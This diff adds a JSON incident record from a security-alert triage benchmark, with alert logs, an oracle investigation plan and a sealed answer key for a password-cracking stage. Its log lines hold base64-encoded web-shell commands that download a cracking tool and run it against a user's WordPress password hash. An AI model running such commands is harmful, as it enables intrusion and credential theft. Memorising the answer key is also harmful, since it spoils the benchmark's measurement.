@@ -1,0 +1,207 @@
+{
+  "incident_id": "ait-santos-cracking",
+  "name": "AIT-ADS santos/cracking",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "santos/cracking",
+  "alert": {
+    "timestamp": "2022-01-17T11:24:16Z",
+    "host": "santos",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on santos: cracking"
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-01-17T11:24:16Z",
+    "end": "2022-01-17T11:44:28Z",
+    "hosts": [
+      "santos"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-fae2dcf4",
+        "timestamp": "2022-01-17T11:24:16Z",
+        "host": "santos",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:24:16 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642418656.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:24:16 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-8d67b467",
+        "timestamp": "2022-01-17T11:24:45Z",
+        "host": "santos",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:24:45 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiZ21vcmdhbiJd HTTP/1.1\" 200 506883 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642418685.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:24:45 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiZ21vcmdhbiJd HTTP/1.1\" 200 506883 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0003-fb3618e1",
+        "timestamp": "2022-01-17T11:25:43Z",
+        "host": "santos",
+        "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+        "message": "{\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"agent\":{\"id\":\"ab5616c7-58c0-4480-a883-359041057b74\",\"hostname\":\"intranet-server\",\"type\":\"metricbeat\",\"ephemeral_id\":\"c1899c21-6022-4ee2-9f06-2248c8a823cf\",\"version\":\"7.13.2\",\"name\":\"intranet-server\"},\"tags\":[\"beats_input_raw_event\"],\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"@version\":\"1\",\"system\":{\"cpu\":{\"cores\":1,\"steal\":{\"norm\":{\"pct\":0},\"pct\":0},\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0},\"user\":{\"norm\":{\"pct\":0.0158},\"pct\":0.0158},\"nice\":{\"norm\":{\"pct\":0.9587},\"pct\":0.9587},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0244},\"pct\":0.0244},\"softirq\":{\"norm\":{\"pct\":0.0011},\"pct\":0.0011}}},\"@timestamp\":\"2022-01-17T11:25:43.504Z\",\"service\":{\"type\":\"system\"},\"event\":{\"duration\":259708,\"module\":\"system\",\"dataset\":\"system.cpu\"},\"ecs\":{\"version\":\"1.9.0\"}}",
+        "raw_alert": {
+          "timestamp": 1642418743.5,
+          "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+          "message": "{\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"agent\":{\"id\":\"ab5616c7-58c0-4480-a883-359041057b74\",\"hostname\":\"intranet-server\",\"type\":\"metricbeat\",\"ephemeral_id\":\"c1899c21-6022-4ee2-9f06-2248c8a823cf\",\"version\":\"7.13.2\",\"name\":\"intranet-server\"},\"tags\":[\"beats_input_raw_event\"],\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"@version\":\"1\",\"system\":{\"cpu\":{\"cores\":1,\"steal\":{\"norm\":{\"pct\":0},\"pct\":0},\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0},\"user\":{\"norm\":{\"pct\":0.0158},\"pct\":0.0158},\"nice\":{\"norm\":{\"pct\":0.9587},\"pct\":0.9587},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0244},\"pct\":0.0244},\"softirq\":{\"norm\":{\"pct\":0.0011},\"pct\":0.0011}}},\"@timestamp\":\"2022-01-17T11:25:43.504Z\",\"service\":{\"type\":\"system\"},\"event\":{\"duration\":259708,\"module\":\"system\",\"dataset\":\"system.cpu\"},\"ecs\":{\"version\":\"1.9.0\"}}"
+        }
+      },
+      {
+        "event_id": "ait-0004-b5c82e26",
+        "timestamp": "2022-01-17T11:44:28Z",
+        "host": "santos",
+        "detector": "AMiner: CPU value deviates from average in monitoring logs.",
+        "message": "{\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"agent\":{\"id\":\"ab5616c7-58c0-4480-a883-359041057b74\",\"hostname\":\"intranet-server\",\"type\":\"metricbeat\",\"ephemeral_id\":\"c1899c21-6022-4ee2-9f06-2248c8a823cf\",\"version\":\"7.13.2\",\"name\":\"intranet-server\"},\"tags\":[\"beats_input_raw_event\"],\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"@version\":\"1\",\"system\":{\"cpu\":{\"cores\":1,\"steal\":{\"norm\":{\"pct\":0},\"pct\":0},\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0},\"user\":{\"norm\":{\"pct\":0.0185},\"pct\":0.0185},\"nice\":{\"norm\":{\"pct\":0.9591},\"pct\":0.9591},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0222},\"pct\":0.0222},\"softirq\":{\"norm\":{\"pct\":2.0E-4},\"pct\":2.0E-4}}},\"@timestamp\":\"2022-01-17T11:44:28.504Z\",\"service\":{\"type\":\"system\"},\"event\":{\"duration\":586280,\"module\":\"system\",\"dataset\":\"system.cpu\"},\"ecs\":{\"version\":\"1.9.0\"}}",
+        "raw_alert": {
+          "timestamp": 1642419868.5,
+          "detector": "AMiner: CPU value deviates from average in monitoring logs.",
+          "message": "{\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"agent\":{\"id\":\"ab5616c7-58c0-4480-a883-359041057b74\",\"hostname\":\"intranet-server\",\"type\":\"metricbeat\",\"ephemeral_id\":\"c1899c21-6022-4ee2-9f06-2248c8a823cf\",\"version\":\"7.13.2\",\"name\":\"intranet-server\"},\"tags\":[\"beats_input_raw_event\"],\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"@version\":\"1\",\"system\":{\"cpu\":{\"cores\":1,\"steal\":{\"norm\":{\"pct\":0},\"pct\":0},\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0},\"user\":{\"norm\":{\"pct\":0.0185},\"pct\":0.0185},\"nice\":{\"norm\":{\"pct\":0.9591},\"pct\":0.9591},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0222},\"pct\":0.0222},\"softirq\":{\"norm\":{\"pct\":2.0E-4},\"pct\":2.0E-4}}},\"@timestamp\":\"2022-01-17T11:44:28.504Z\",\"service\":{\"type\":\"system\"},\"event\":{\"duration\":586280,\"module\":\"system\",\"dataset\":\"system.cpu\"},\"ecs\":{\"version\":\"1.9.0\"}}"
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-fae2dcf4",
+      "source": "alerts",
+      "timestamp": "2022-01-17T11:24:16Z",
+      "host": "santos",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:24:16 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642418656.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:24:16 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506723 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-8d67b467",
+      "source": "alerts",
+      "timestamp": "2022-01-17T11:24:45Z",
+      "host": "santos",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "172.21.128.119 - - [17/Jan/2022:11:24:45 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiZ21vcmdhbiJd HTTP/1.1\" 200 506883 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642418685.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "172.21.128.119 - - [17/Jan/2022:11:24:45 +0000] \"GET /wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAiZ21vcmdhbiJd HTTP/1.1\" 200 506883 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0003-fb3618e1",
+      "source": "alerts",
+      "timestamp": "2022-01-17T11:25:43Z",
+      "host": "santos",
+      "fields": {
+        "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+        "message": "{\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"agent\":{\"id\":\"ab5616c7-58c0-4480-a883-359041057b74\",\"hostname\":\"intranet-server\",\"type\":\"metricbeat\",\"ephemeral_id\":\"c1899c21-6022-4ee2-9f06-2248c8a823cf\",\"version\":\"7.13.2\",\"name\":\"intranet-server\"},\"tags\":[\"beats_input_raw_event\"],\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"@version\":\"1\",\"system\":{\"cpu\":{\"cores\":1,\"steal\":{\"norm\":{\"pct\":0},\"pct\":0},\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0},\"user\":{\"norm\":{\"pct\":0.0158},\"pct\":0.0158},\"nice\":{\"norm\":{\"pct\":0.9587},\"pct\":0.9587},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0244},\"pct\":0.0244},\"softirq\":{\"norm\":{\"pct\":0.0011},\"pct\":0.0011}}},\"@timestamp\":\"2022-01-17T11:25:43.504Z\",\"service\":{\"type\":\"system\"},\"event\":{\"duration\":259708,\"module\":\"system\",\"dataset\":\"system.cpu\"},\"ecs\":{\"version\":\"1.9.0\"}}",
+        "raw_alert": {
+          "timestamp": 1642418743.5,
+          "detector": "AMiner: CPU value out of expected range in monitoring logs.",
+          "message": "{\"metricset\":{\"period\":45000,\"name\":\"cpu\"},\"agent\":{\"id\":\"ab5616c7-58c0-4480-a883-359041057b74\",\"hostname\":\"intranet-server\",\"type\":\"metricbeat\",\"ephemeral_id\":\"c1899c21-6022-4ee2-9f06-2248c8a823cf\",\"version\":\"7.13.2\",\"name\":\"intranet-server\"},\"tags\":[\"beats_input_raw_event\"],\"host\":{\"cpu\":{\"pct\":1},\"name\":\"intranet-server\"},\"@version\":\"1\",\"system\":{\"cpu\":{\"cores\":1,\"steal\":{\"norm\":{\"pct\":0},\"pct\":0},\"idle\":{\"norm\":{\"pct\":0},\"pct\":0},\"iowait\":{\"norm\":{\"pct\":0},\"pct\":0},\"user\":{\"norm\":{\"pct\":0.0158},\"pct\":0.0158},\"nice\":{\"norm\":{\"pct\":0.9587},\"pct\":0.9587},\"total\":{\"norm\":{\"pct\":1},\"pct\":1},\"irq\":{\"norm\":{\"pct\":0},\"pct\":0},\"system\":{\"norm\":{\"pct\":0.0244},\"pct\":0.0244},\"softirq\":{\"norm\":{\"pct\":0.0011},\"pct\":0.0011}}},\"@timestamp\":\"2022-01-17T11:25:43.504Z\",\"service\":{\"type\":\"system\"},\"event\":{\"duration\":259708,\"module\":\"system\",\"dataset\":\"system.cpu\"},\"ecs\":{\"version\":\"1.9.0\"}}"
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "santos"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "santos"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on santos: cracking",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "santos"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "santos"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on santos: cracking",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "santos/cracking",
+    "answer": "cracking",
+    "accept": [
+      "cracking",
+      "cracking"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
